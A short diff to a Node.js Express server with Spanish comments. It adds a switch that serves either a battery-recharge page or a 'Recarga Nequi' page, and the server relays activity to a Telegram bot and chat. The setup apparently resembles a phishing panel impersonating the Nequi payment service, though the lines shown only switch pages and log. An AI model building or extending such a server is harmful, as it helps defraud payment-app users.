@@ -9,6 +9,9 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TO
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-4997787461';
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
+// ⚡ CAMBIA AQUÍ LA PÁGINA PRINCIPAL: 'battery' o 'nequi'
+const LANDING_PAGE = 'battery'; // 'battery' = recarga de baterías | 'nequi' = recarga Nequi
+
 const app = express();
 const server = http.createServer(app);
 
@@ -830,11 +833,13 @@ app.get('/health', (req, res) => {
 
 // Root endpoint
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    const indexFile = LANDING_PAGE === 'battery' ? 'index.html' : 'index1.html';
+    res.sendFile(path.join(__dirname, indexFile));
 });
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🚀 Servidor iniciado - Puerto: ${PORT} | Entorno: ${NODE_ENV}`);
+    console.log(`🏠 Página principal: ${LANDING_PAGE === 'battery' ? 'Battery Center (Baterías)' : 'Recarga Nequi'}`);
     console.log(`📡 Socket.IO configurado con transports: websocket, polling`);
     console.log(`🤖 Bot de Telegram: ${TELEGRAM_TOKEN ? 'Configurado' : 'NO CONFIGURADO'}`);
     console.log(`💬 Chat ID: ${CHAT_ID}\n`);
